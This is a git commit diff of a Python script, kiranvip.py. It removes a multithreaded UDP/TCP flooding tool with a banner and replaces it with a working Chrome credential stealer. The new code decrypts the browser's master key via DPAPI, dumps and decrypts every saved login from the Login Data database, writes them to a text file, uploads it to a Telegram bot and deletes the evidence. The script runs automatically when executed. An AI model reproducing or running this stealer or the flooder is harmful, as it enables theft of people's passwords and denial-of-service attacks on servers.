1a339939bc2efb40ff084890ff71a45e973cab7c
Duynguyen123x <127020762+Duynguyen123x@users.noreply.github.com>
2025-03-21 20:24:32 +0700

    Update kiranvip.py

--- kiranvip.py
+++ kiranvip.py
@@ -1,125 +1,75 @@
-import random
-import socket
-import threading
-import time
-import os,sys
-import random, socket, threading
-import os, socket, threading, colorsys, time, random
-import socket
-import sys
 import os
-import time
-import random
-import threading
-import base64 as b64
-from types import MethodType
-import string
+import sqlite3
+import win32crypt
 import json
-import sys
-os.system("clear")
+import base64
+import shutil
+from Cryptodome.Cipher import AES
+import requests
 
-print("""
-\033[91m██╗░░██╗██╗██████╗░░█████╗░███╗░░██╗
-██║░██╔╝██║██╔══██╗██╔══██╗████╗░██║
-█████═╝░██║██████╔╝███████║██╔██╗██║
-██╔═██╗░██║██╔══██╗██╔══██║██║╚████║
-██║░╚██╗██║██║░░██║██║░░██║██║░╚███║
-╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+# === Cấu hình Telegram ===
+BOT_TOKEN = 'YOUR_BOT_TOKEN'
+CHAT_ID = 'YOUR_CHAT_ID'
 
-░██████╗░█████╗░███╗░░░███╗██████╗░
-██╔════╝██╔══██╗████╗░████║██╔══██╗
-╚█████╗░███████║██╔████╔██║██████╔╝
-░╚═══██╗██╔══██║██║╚██╔╝██║██╔═══╝░
-██████╔╝██║░░██║██║░╚═╝░██║██║░░░░░
-╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░
+# === Hàm gửi file lên Telegram ===
+def send_to_telegram(file_path):
+    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
+    files = {'document': open(file_path, 'rb')}
+    data = {'chat_id': CHAT_ID}
+    response = requests.post(url, files=files, data=data)
+    print(response.text)
 
-██╗░░░██╗██╗██████╗░
-██║░░░██║██║██╔══██╗
-╚██╗░██╔╝██║██████╔╝
-░╚████╔╝░██║██╔═══╝░
-░░╚██╔╝░░██║██║░░░░░
-░░░╚═╝░░░╚═╝╚═╝░░░░░
-Kiran Samp""")
-print("\033[31m━━━ Ready? (y/n)")
-choice = str(input("┗━>\033[0m:"))
-time.sleep(1)
-print("\033[31m━━━ Host/IP")
-ip = str(input("┗━>\033[0m:"))
-time.sleep(1)
-print("\033[31m━━━ Port")
-port = int(input("┗━>\033[0m:"))
-time.sleep(1)
-print("\033[31m━━━ Packet")    
-print("\033[31m━━━ Min Packet 100")
-times = int(input("┗━>\033[0m:"))
-time.sleep(1)
-print("\033[31m━━━ Threads")
-print("\033[31m━━━ Min Threads 110")
-threads = int(input("┗━>\033[0m:"))
-def xxxx():
-  data = random._urandom(9591)
-  i = random.choice(("[•]","[•]","[•]"))
-  while True:
+# === Giải mã AES Key ===
+def get_master_key():
+    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Local State')
+    with open(local_state_path, "r", encoding='utf-8') as file:
+        local_state = json.loads(file.read())
+    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+    encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
+    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return master_key
+
+def decrypt_password(buff, master_key):
     try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      addr = (str(ip),int(port))
-      for x in range(times):
-        s.sendto(data,addr)
-        print(i +" \033[91m}=====> Attacking To  \033[0m%s:%s!!!"%(ip,port))
-    except:
-      print("[!] Kiran Exploit")
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        return "Cannot decrypt"
 
-def xxx():
-  data = random._urandom(9386)
-  i = random.choice(("[•]","[•]","[•]"))
-  while True:
-    try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      addr = (str(ip),int(port))
-      for x in range(times):
-        s.sendto(data,addr)
-        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
-    except:
-      print("[!] Subscribe KiranSamp")
+# === Hàm chính lấy pass ===
+def get_chrome_passwords():
+    master_key = get_master_key()
+    login_db = os.environ['LOCALAPPDATA'] + r"\Google\Chrome\User Data\default\Login Data"
+    filename = "ChromePasswords.db"
+    shutil.copy2(login_db, filename)
 
-def xx():
-  data = random._urandom(9047)
-  i = random.choice(("[•]","[•]","[•]"))
-  while True:
-    try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      s.connect((ip,port))
-      s.send(data)
-      for x in range(times):
-        s.send(data)
-        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
-    except:
-      s.close()
-      print("[!] Menyerang Server")
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    
+    with open("passwords.txt", "w", encoding='utf-8') as f:
+        for row in cursor.fetchall():
+            url = row[0]
+            username = row[1]
+            encrypted_password = row[2]
+            
+            if encrypted_password[:3] == b'v10':
+                decrypted_password = decrypt_password(encrypted_password, master_key)
+            else:
+                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
+            
+            f.write(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
+    
+    cursor.close()
+    db.close()
+    os.remove(filename)
+    
+    # Gửi file passwords.txt qua Telegram
+    send_to_telegram("passwords.txt")
+    os.remove("passwords.txt")
 
-def x():
-  data = random._urandom(9316)
-  i = random.choice(("[•]","[•]","[•]"))
-  while True:
-    try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      s.connect((ip,port))
-      s.send(data)
-      for x in range(times):
-        s.send(data)
-        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
-    except:
-      s.close()
-      print("[!] SUBSCRIBE KIRAN SAMP")
-
-for y in range(threads):
-  if choice == 'y':
-    th = threading.Thread(target = xxxx)
-    th.start()
-    th = threading.Thread(target = xxx)
-    th.start()
-  else:
-    th = threading.Thread(target = xx)
-    th.start()
-    th = threading.Thread(target = x)
-    th.start()
+# === Chạy ===
+get_chrome_passwords()
